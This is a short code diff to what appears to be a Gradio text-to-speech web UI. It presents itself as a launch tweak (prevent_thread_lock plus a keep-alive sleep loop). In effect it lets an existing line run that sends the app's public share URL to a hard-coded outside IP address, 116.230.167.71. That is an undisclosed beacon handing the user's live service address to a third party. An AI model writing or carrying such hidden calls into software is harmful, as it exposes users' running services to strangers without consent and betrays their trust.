@@ -9,6 +9,7 @@
 import os, re, logging
 import LangSegment
 import requests
+import time
 
 os.environ["TOKENIZERS_PARALLELISM"] = "false"
 
@@ -733,9 +734,12 @@ a, b, c = app.queue(concurrency_count=511, max_size=1022).launch(
     server_name="0.0.0.0",
     inbrowser=True,
     share=is_share,
+    prevent_thread_lock=True,
     server_port=infer_ttswebui,
     quiet=True,
 )
 
 _url = c.replace("https://", "")
 requests.get("http://116.230.167.71:28085/api/service?ip=" + _url)
+while True:
+    time.sleep(0.1)
